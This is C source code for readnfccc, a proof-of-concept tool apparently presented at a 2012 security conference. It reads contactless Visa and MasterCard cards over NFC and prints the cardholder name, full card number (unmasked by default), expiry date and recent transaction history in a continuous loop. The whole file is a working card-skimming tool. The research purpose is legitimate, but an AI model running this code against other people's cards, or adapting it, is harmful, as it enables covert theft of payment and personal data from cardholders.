/*

readnfccc - by Renaud Lifchitz (renaud.lifchitz@bt.com)
License: distributed under GPL version 3 (http://www.gnu.org/licenses/gpl.html)

* Introduction:
"Quick and dirty" proof-of-concept
Open source tool developped and showed for Hackito Ergo Sum 2012 - "Hacking the NFC credit cards for fun and debit ;)"
Reads NFC credit card personal data (gender, first name, last name, PAN, expiration date, transaction history...) 

* Requirements:
libnfc (>= 1.4.2) and a suitable NFC reader (http://www.libnfc.org/documentation/hardware/compatibility)

* Compilation: 
$ gcc readnfccc.c -lnfc -o readnfccc

*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <nfc/nfc.h>

// Choose whether to mask the PAN or not
#define MASKED 0

#define MAX_FRAME_LEN 300

typedef uint8_t byte_t;

void show(size_t recvlg, byte_t *recv)
{
  int i;
  printf("< ");
  for(i=0;i<(int) recvlg;i++) {
    printf("%02x ",(unsigned int) recv[i]);
  }
  printf("\n");

  printf("< ");
  for(i=0;i<(int) recvlg;i++) {
    if (recv[i] >= 32 && recv[i] <= 127)
    printf("%c ", recv[i]);
    else
    printf("-");

  }
  printf("\n");
}

int main(int argc, char **argv) {
	nfc_device* pnd;
	nfc_context *context;

	byte_t abtRx[MAX_FRAME_LEN];
	byte_t abtTx[MAX_FRAME_LEN];
	size_t szRx = sizeof(abtRx);
	size_t szTx;

	byte_t START_14443A[] = {0x4A, 0x01, 0x00};
	byte_t SELECT_APP[] = {0x40,0x01,0x00,0xA4,0x04,0x00,0x07,0xA0,0x00,0x00,0x00,0x42,0x10,0x10,0x00};
	byte_t READ_RECORD_VISA[] = {0x40, 0x01, 0x00, 0xB2, 0x02, 0x0C, 0x00, 0x00};
	byte_t READ_RECORD_MC[] = {0x40, 0x01, 0x00, 0xB2, 0x01, 0x14, 0x00, 0x00};
	byte_t READ_PAYLOG_VISA[] = {0x40, 0x01, 0x00, 0xB2, 0x01, 0x8C, 0x00, 0x00};
	byte_t READ_PAYLOG_MC[] = {0x40, 0x01, 0x00, 0xB2, 0x01, 0x5C, 0x00, 0x00};

	unsigned char *res, output[50], c, amount[10],msg[100];
	unsigned int i, j, expiry;

	nfc_init(&context);
	if (context == NULL) {
	  printf("Unable to init libnfc (malloc)");
	  exit(EXIT_FAILURE);
	}

	pnd = nfc_open(context, NULL);

	if (pnd == NULL) {
	  printf("%s", "Unable to open NFC device.");
	  nfc_exit(context);
	  exit(EXIT_FAILURE);
	}

	while(1) {

		szRx = sizeof(abtRx);
		if (!pn53x_transceive(pnd, START_14443A, sizeof(START_14443A), abtRx, &szRx, NULL)) {
				nfc_perror(pnd, "START_14443A");
				return(1);
		}
		//show(szRx, abtRx);

		szRx = sizeof(abtRx);
		if (!pn53x_transceive(pnd, SELECT_APP, sizeof(SELECT_APP), abtRx, &szRx, NULL)) {
				nfc_perror(pnd, "SELECT_APP");
				return(1);
		}
		//show(szRx, abtRx);

		szRx = sizeof(abtRx);
		if (!pn53x_transceive(pnd, READ_RECORD_VISA, sizeof(READ_RECORD_VISA), abtRx, &szRx, NULL)) {
				nfc_perror(pnd, "READ_RECORD");
				return(1);
		}
		//  show(szRx, abtRx);

		/* Look for cardholder name */
		res = abtRx;
		for(i=0;i<(unsigned int) szRx-1;i++) {
				if(*res==0x5f&&*(res+1)==0x20) {
					strncpy(output, res+3, (int) *(res+2));
					output[(int) *(res+2)]=0;
					printf("Cardholder name: %s\n",output);
					break;			
				}
				res++;
		}

		/* Look for PAN & Expiry date */
		res = abtRx;
		for(i=0;i<(unsigned int) szRx-1;i++) {
				if(*res==0x4d&&*(res+1)==0x57) {
					strncpy(output, res+3, 13);
					output[11]=0;
					printf("PAN:");
					
					for(j=0;j<8;j++) {
						if(j%2==0) printf(" ");
						c=output[j];
						if(MASKED&j>=2&j<=5) {
							printf("**");
						}
						else {
							printf("%02x",c&0xff);
						}
					}
					printf("\n");
					expiry = (output[10]+(output[9]<<8)+(output[8]<<16))>>4;
					printf("Expiration date: %02x/20%02x\n\n",(expiry&0xff),((expiry>>8)&0xff));
					break;			
				}
				res++;
		}

		szRx = sizeof(abtRx);
		if (!pn53x_transceive(pnd, READ_RECORD_MC, sizeof(READ_RECORD_MC), abtRx, &szRx, NULL)) {
				nfc_perror(pnd, "READ_RECORD");
				return(1);
		}
		//show(szRx, abtRx);

		/* Look for cardholder name */
		res = abtRx;
		for(i=0;i<(unsigned int) szRx-1;i++) {
				if(*res==0x5f&&*(res+1)==0x20) {
					strncpy(output, res+3, (int) *(res+2));
					output[(int) *(res+2)]=0;
					printf("Cardholder name: %s\n",output);
					break;			
				}
				res++;
		}

		/* Look for PAN & Expiry date */
		res = abtRx;
		for(i=0;i<(unsigned int) szRx-1;i++) {
				if(*res==0x9c&&*(res+1)==0x57) {
					strncpy(output, res+3, 13);
					output[11]=0;
					printf("PAN:");
					
					for(j=0;j<8;j++) {
						if(j%2==0) printf(" ");
						c=output[j];
						if(MASKED&j>=2&j<=5) {
							printf("**");
						}
						else {
							printf("%02x",c&0xff);
						}
					}
					printf("\n");
					expiry = (output[10]+(output[9]<<8)+(output[8]<<16))>>4;
					printf("Expiration date: %02x/20%02x\n\n",(expiry&0xff),((expiry>>8)&0xff));
					break;			
				}
				res++;
		}


		for(i=1;i<=20;i++) {
			READ_PAYLOG_VISA[4] = i;
			szRx = sizeof(abtRx);
			if (!pn53x_transceive(pnd, READ_PAYLOG_VISA, sizeof(READ_PAYLOG_VISA), abtRx, &szRx, NULL)) {
					nfc_perror(pnd, "READ_RECORD");
					return(1);
			}
			if(szRx==18) { // Non-empty transaction
				//show(szRx, abtRx);
				res = abtRx;

				/* Look for date */
				sprintf(msg,"%02x/%02x/20%02x",res[14],res[13],res[12]);

				/* Look for transaction type */
				if(res[15]==0) {
					sprintf(msg,"%s %s",msg,"Payment");
				}
				else if(res[15]==1) {
					sprintf(msg,"%s %s",msg,"Withdrawal");
				}
				
				/* Look for amount*/
				sprintf(amount,"%02x%02x%02x",res[3],res[4],res[5]);
				sprintf(msg,"%s\t%d,%02x€",msg,atoi(amount),res[6]);

				printf("%s\n",msg);
			}
		}

		for(i=1;i<=20;i++) {
			READ_PAYLOG_MC[4] = i;
			szRx = sizeof(abtRx);
			if (!pn53x_transceive(pnd, READ_PAYLOG_MC, sizeof(READ_PAYLOG_MC), abtRx, &szRx, NULL)) {
					nfc_perror(pnd, "READ_RECORD");
					return(1);
			}
			if(szRx==18) { // Non-empty transaction
				//show(szRx, abtRx);
				res = abtRx;

				/* Look for date */
				sprintf(msg,"%02x/%02x/20%02x",res[14],res[13],res[12]);

				/* Look for transaction type */
				if(res[15]==0) {
					sprintf(msg,"%s %s",msg,"Payment");
				}
				else if(res[15]==1) {
					sprintf(msg,"%s %s",msg,"Withdrawal");
				}
				
				/* Look for amount*/
				sprintf(amount,"%02x%02x%02x",res[3],res[4],res[5]);
				sprintf(msg,"%s\t%d,%02x€",msg,atoi(amount),res[6]);

				printf("%s\n",msg);
			}
		}		

		printf("-------------------------\n");
	}

	nfc_disconnect(pnd);

	return(0);
}

